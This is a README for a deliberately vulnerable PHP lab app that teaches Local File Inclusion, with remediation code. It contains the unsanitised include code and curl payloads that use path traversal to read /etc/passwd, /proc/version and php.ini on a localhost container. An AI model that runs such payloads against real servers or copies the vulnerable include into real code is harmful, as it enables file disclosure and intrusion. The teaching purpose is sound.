# Local File Inclusion (LFI) Vulnerability Demo 

## Overview

This repository contains a minimal, intentionally-vulnerable web application designed to demonstrate **Local File Inclusion (LFI)** vulnerabilities in PHP. This demo is intended for educational purposes only.

### What is LFI?

**Local File Inclusion (LFI)** is a web application vulnerability that occurs when an application includes files from the local filesystem without proper validation of user input. Attackers can exploit this vulnerability to:

- Read sensitive files from the server (e.g., configuration files, source code)
- Execute malicious code if file upload is also possible
- Access system files through path traversal attacks (e.g., `/etc/passwd`)

### Why is LFI Dangerous?

LFI vulnerabilities can lead to:
- **Information Disclosure**: Attackers can read configuration files, source code, or other sensitive data
- **Remote Code Execution (RCE)**: If combined with file upload capabilities, attackers can upload and execute malicious PHP code
- **System Compromise**: In some cases, LFI can be escalated to gain full control of the server

### What This Demo Does

This application demonstrates a classic LFI vulnerability where user input (via the `page` GET parameter) is directly concatenated into a file path without sanitization. The vulnerable code is clearly marked and intentionally insecure for educational purposes.

## ⚠️ Security Warning

**IMPORTANT**: This application contains intentional security vulnerabilities and must **ONLY** be run in an isolated lab environment. The application is configured to bind only to `127.0.0.1:8080` and should **NEVER** be exposed to the internet or used in production.

**DEMO CONFIGURATION**: This demo is configured to allow reading files from anywhere in the container filesystem, including system files like `/etc/passwd`. This is **FOR DEMONSTRATION PURPOSES ONLY** to show the full impact of LFI vulnerabilities. In a real-world scenario, such access could lead to complete system compromise.

## Quick Start

### Prerequisites

- Docker and Docker Compose installed on your system
- Access to a terminal/command line

### Running the Demo

1. **Clone the repository:**
   ```bash
   git clone https://github.com/Purvapatel4725/Local-File-Inclusion-Demo
   ```
   ```bash
   cd /Local-File-Inclusion-Demo
   ```

2. **Build and start the container:**
   ```bash
   docker-compose build
   ```
   ```bash
   docker-compose up
   ```

3. **Access the application:**
   - Open your browser and navigate to: `http://127.0.0.1:8080`
   - Or use curl: `curl http://127.0.0.1:8080`

4. **Stop the container:**
   ```bash
   docker-compose down
   ```

## Demo Script

### Step 1: Access the Homepage

```bash
curl http://127.0.0.1:8080/
```

Or open `http://127.0.0.1:8080` in your browser.

### Step 2: View a Safe Page

```bash
curl http://127.0.0.1:8080/vulnerable.php?page=about.php
```

This should display the content of `about.php` from the `includes/` directory.

### Step 3: Try Path Traversal

Attempt to read files using path traversal. Note that in the container, files are located at `/var/www/html/`, so path traversal works relative to the `includes/` directory:

```bash
# Read README_FILES.txt directly (no traversal needed)
curl "http://127.0.0.1:8080/vulnerable.php?page=README_FILES.txt"

# Read application source code using path traversal (go up one level from includes/)
curl "http://127.0.0.1:8080/vulnerable.php?page=../index.php"
curl "http://127.0.0.1:8080/vulnerable.php?page=../vulnerable.php"
```

**Note**: The container structure is flat (files are copied directly to `/var/www/html/`), so `../../templates/includes/README_FILES.txt` won't work because there's no `templates/` directory in the container. Use `../` to go up one level from the `includes/` directory to access files in the web root.

### Step 3b: Read Container/System Files (DEMO ONLY)

**⚠️ DEMO ONLY**: This application is configured to demonstrate reading container system files. In a real attack, this could expose sensitive information.

Attempt to read container system files:

```bash
# Read /etc/passwd (container's user database)
curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/passwd"

# Read /etc/hostname (container hostname)
curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/hostname"

# Read /proc/version (kernel version info)
curl "http://127.0.0.1:8080/vulnerable.php?page=/proc/version"

# Read /etc/os-release (OS information)
curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/os-release"

# Read PHP configuration
curl "http://127.0.0.1:8080/vulnerable.php?page=/usr/local/etc/php/php.ini"
```

**Note**: This demo allows reading files from anywhere in the container filesystem. In a real-world scenario, this could expose sensitive configuration files, source code, or system information. The container is isolated from the host system, making this safe for educational use.

### Step 4: Try a Non-Existent File

```bash
curl "http://127.0.0.1:8080/vulnerable.php?page=nonexistent.php"
```

This should display a friendly error message indicating the file does not exist.

### Step 5: View Other Demo Files

```bash
curl http://127.0.0.1:8080/vulnerable.php?page=contact.php
curl http://127.0.0.1:8080/vulnerable.php?page=help.php
```

### Step 6: Advanced Path Traversal Examples

Try different path traversal techniques:

```bash
# Using relative paths to access system files (go up from includes/, then up from web root)
curl "http://127.0.0.1:8080/vulnerable.php?page=../../etc/passwd"

# Using absolute paths (direct access - recommended for system files)
curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/passwd"

# Reading application source code (go up one level from includes/ to web root)
curl "http://127.0.0.1:8080/vulnerable.php?page=../index.php"
curl "http://127.0.0.1:8080/vulnerable.php?page=../vulnerable.php"

# Access files in includes/ directory
curl "http://127.0.0.1:8080/vulnerable.php?page=about.php"
curl "http://127.0.0.1:8080/vulnerable.php?page=README_FILES.txt"
```

**Container Structure Note**: In the container, files are located at:
- `/var/www/html/` - Web root (contains `index.php`, `vulnerable.php`)
- `/var/www/html/includes/` - Includes directory (contains `about.php`, `contact.php`, `help.php`, `README_FILES.txt`)

Path traversal from `includes/` using `../` goes up to `/var/www/html/`, allowing access to application files. Using `../../` goes up to `/var/www/`, which can then access system directories like `/etc/`.

## Browser-Based Demo

1. Navigate to `http://127.0.0.1:8080` in your browser
2. Click on the "About", "Contact", or "Help" links
3. Try entering different file names in the form (e.g., `about.php`, `contact.php`, `README_FILES.txt`)
4. Attempt path traversal to access application files:
   - `../index.php` - Access the homepage source
   - `../vulnerable.php` - Access the vulnerable handler source
5. **DEMO ONLY**: Try reading container files using absolute paths:
   - `/etc/passwd` - Container user database
   - `/etc/hostname` - Container hostname
   - `/proc/version` - Kernel version
   - `/etc/os-release` - OS information
6. Try a non-existent file to see the error handling (e.g., `nonexistent.php`)

## Project Structure

**Local Development Structure:**
```
.
├── README.md                 # This file
├── docker-compose.yml        # Docker Compose configuration
├── Dockerfile               # Docker image definition
└── templates/
    ├── index.php            # Homepage with navigation
    ├── vulnerable.php       # The vulnerable file inclusion handler
    └── includes/
        ├── about.php        # Demo file: About page
        ├── contact.php      # Demo file: Contact page
        ├── help.php         # Demo file: Help page
        └── README_FILES.txt # List of available demo files
```

**Container Structure (after Docker build):**
```
/var/www/html/
├── index.php                # Homepage
├── vulnerable.php           # Vulnerable handler
└── includes/
    ├── about.php
    ├── contact.php
    ├── help.php
    └── README_FILES.txt
```

**Note**: The Dockerfile copies `templates/` contents directly to `/var/www/html/`, so the `templates/` directory structure doesn't exist in the container. This is why path traversal like `../../templates/includes/README_FILES.txt` won't work - use `../` to go up one level from `includes/` to access files in the web root.

## The Vulnerability

The vulnerable code is located in `templates/vulnerable.php`:

```php
// VULNERABLE CODE: Direct concatenation without sanitization
$file_path = __DIR__ . '/includes/' . $_GET['page'];
include $file_path;
```

This code directly concatenates user input (`$_GET['page']`) into a file path without any validation or sanitization, allowing attackers to use path traversal sequences (e.g., `../`) to access files outside the intended directory.

**DEMO ENHANCEMENT**: The vulnerable code has been enhanced for demonstration purposes to also allow reading files from anywhere in the container filesystem, including system files like `/etc/passwd`, `/etc/hostname`, and configuration files. This demonstrates the full severity of LFI vulnerabilities in a controlled, isolated environment.

## Remediation

Here are several ways to fix the LFI vulnerability:

### 1. Whitelist Approach (Recommended)

Only allow specific, predefined files:

```php
$allowed = ['about.php', 'contact.php', 'help.php'];
$page = $_GET['page'] ?? '';

if (!in_array($page, $allowed)) {
    http_response_code(403);
    exit('Forbidden: Invalid page requested');
}

$file_path = __DIR__ . '/includes/' . $page;
include $file_path;
```

### 2. Use `basename()` to Prevent Path Traversal

Strip directory components from the filename:

```php
$page = basename($_GET['page'] ?? '');
$file_path = __DIR__ . '/includes/' . $page;

if (!file_exists($file_path)) {
    http_response_code(404);
    exit('File not found');
}

include $file_path;
```

### 3. Use `realpath()` with Validation

Validate that the resolved path is within the allowed directory:

```php
$page = $_GET['page'] ?? '';
$base_dir = __DIR__ . '/includes/';
$file_path = realpath($base_dir . $page);

if ($file_path === false || strpos($file_path, realpath($base_dir)) !== 0) {
    http_response_code(403);
    exit('Forbidden: Invalid file path');
}

include $file_path;
```

### 4. Configure `open_basedir` in PHP

Restrict PHP to only access files within a specific directory by setting `open_basedir` in `php.ini`:

```ini
open_basedir = /var/www/html
```

This provides an additional layer of protection at the PHP configuration level.

## Container Isolation

**⚠️ IMPORTANT**: This demo is configured to allow reading container system files for educational purposes. While this demonstrates the full impact of LFI vulnerabilities, it is safe because:

- The container only binds to `127.0.0.1:8080` (localhost only)
- The container does not mount any host directories
- All files accessed are within the isolated Docker container
- The container cannot access the host system's filesystem
- This is for **DEMO/EDUCATIONAL USE ONLY** and must never be deployed in production

**What you can read in this demo:**
- Container system files (`/etc/passwd`, `/etc/hostname`, `/proc/*`, etc.)
- Application source code within the container
- PHP configuration files
- Any file readable by the web server user within the container

**What you CANNOT access:**
- Host system files (the container is isolated)
- Files outside the container filesystem

## Educational Use

This demo is designed for:
- Understanding LFI vulnerabilities
- Learning about secure coding practices
- Demonstrating the importance of input validation

